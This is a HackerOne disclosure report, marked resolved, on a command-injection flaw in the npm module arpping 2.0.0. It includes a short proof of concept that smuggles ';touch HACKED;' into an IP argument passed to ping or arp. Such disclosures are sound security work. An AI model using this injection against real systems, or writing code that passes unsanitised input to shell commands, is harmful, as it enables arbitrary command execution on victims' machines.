# [C] [arpping] Remote Code Execution

## Summary
Severity: Critical
Program: Node.js third-party modules
Weakness: Code Injection
Reporter: solov9ev
State: resolved
Disclosed: 2021-01-14T08:39:29.702Z
Source: https://hackerone.com/reports/972220

## Details
I would like to report `RCE` in `arpping`
It allows to execute arbitrary commands on the victim's PC

# Module

**module name:** arpping
**version:** 2.0.0
**npm page:** `https://www.npmjs.com/package/arpping`

## Module Description

Discover and search for internet-connected devices (locally) using ping and arp

## Module Stats

[16] weekly downloads

# Vulnerability

## Vulnerability Description

Code injection occurs when using commands: `ping`, `arp`

## Steps To Reproduce:

- Create and run the following POC index.js:

```javascript
const Arpping = require('arpping');

var arpping = new Arpping();
arpping.ping(["127.0.0.1;touch HACKED;"]); // arpping.arp(["127.0.0.1; touch HACKED;"]);
```
- The exploit worked and created the file - `HACKED`

{F972163}

## Patch

_Trimmed to 38 lines — full report: https://hackerone.com/reports/972220_
